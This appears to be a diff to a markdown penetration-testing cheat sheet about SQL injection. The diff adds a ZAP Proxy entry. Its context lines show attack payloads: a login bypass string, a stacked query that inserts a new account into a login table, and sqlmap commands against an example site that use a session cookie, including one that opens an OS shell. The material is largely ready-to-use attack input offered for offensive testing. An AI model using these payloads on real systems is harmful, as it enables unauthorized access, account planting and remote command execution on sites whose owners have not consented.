@@ -29,7 +29,7 @@
 ' OR 'x'='x
 ```
 
-blah';insert into login values('john','apple123');-- `Insert new details if sql injection found in login page in username tab enter`\
+blah';insert into login values('john','apple123');-- `Insert new details if sql injection found in login page in username tab enter`
 
 ### sqlmap
 
@@ -43,3 +43,7 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't r
 you want to dump`
 
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value don't remove square brackets]" --os-shell `For OS shell this is the command`
+
+### ZAP Proxy - web scanner
+
+`zaproxy`
